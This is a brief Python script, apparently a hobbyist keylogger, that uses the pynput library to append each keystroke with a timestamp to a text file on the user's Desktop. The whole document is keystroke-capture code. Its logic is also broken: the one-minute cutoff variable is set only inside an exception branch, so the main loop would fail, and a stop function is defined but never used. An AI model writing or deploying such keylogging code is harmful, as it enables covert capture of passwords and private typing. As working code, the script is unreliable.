from pynput import keyboard
from datetime import datetime,timedelta
import os

desktop_path = os.path.join(os.path.expanduser("~"),"Desktop","bebe_desktop.txt")

def on_press(key):
    try:
        with open(desktop_path,"a") as file:
            file.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(desktop_path, "a") as file:
            file.write(f"{datetime.now()} - {key}\n")
            end_time = datetime.now() + timedelta(minutes=1)

def stop_listeren():
    if datetime.now() >= end_time:
        return False

with keyboard.Listener(on_press=on_press) as listener:
    while datetime.now() < end_time:
        pass
    listener.stop()

